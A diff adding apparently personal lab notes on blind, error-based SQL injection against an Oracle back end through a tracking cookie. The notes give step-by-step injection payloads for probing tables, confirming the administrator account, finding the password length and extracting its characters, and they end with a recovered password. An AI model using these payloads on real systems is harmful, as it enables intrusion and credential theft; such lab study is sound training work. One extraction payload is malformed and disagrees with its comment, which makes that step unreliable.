@@ -1,0 +1,53 @@
+Blind SQL injection with conditional errors
+
+Vulnerable parameter: tracking cookie
+
+Goals:
+- Output the administrator password
+- Login as the administrator user
+
+Analysis:
+---------
+
+==========Step 1: Confirm that the parameter is vulnerable to blind SQLi==========
+' || (select '') || '
+-> error, maybe it's an oracle database.
+
+' || (select '' from dual) || '
+-> 200 OK, oracle database
+
+' || (select '' from dualfiewjfow) || '
+-> error
+
+==========Step 2: Confirm that we have a users table==========
+' || (select '' from users where rownum =1) || ' 
+-> 200 OK, users table exists
+
+==========Step 3: Confirm that username administrator exists users table==========
+' || (select '' from users where username='administrator') || '
+-> 200 OK, the username administrator exists
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+-> 200 OK
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || ' 
+-> Internal server error -> administrator user exists. The FROM is executed first, so it will generate the error.
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || ' 
+-> 200 response -> user does not exist in database
+
+==========Step 4: Determine length of password==========
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '
+-> Internal server error
+...
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>20) || ' 
+-> 200 response
+-> length of password is 20
+
+==========Step 5: Output the administrator password==========
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,,1)='a') || ' 
+-> w is not the first character of the password
+
+wjuc497wl6szhbtf0cbf
+
+script.py <url>
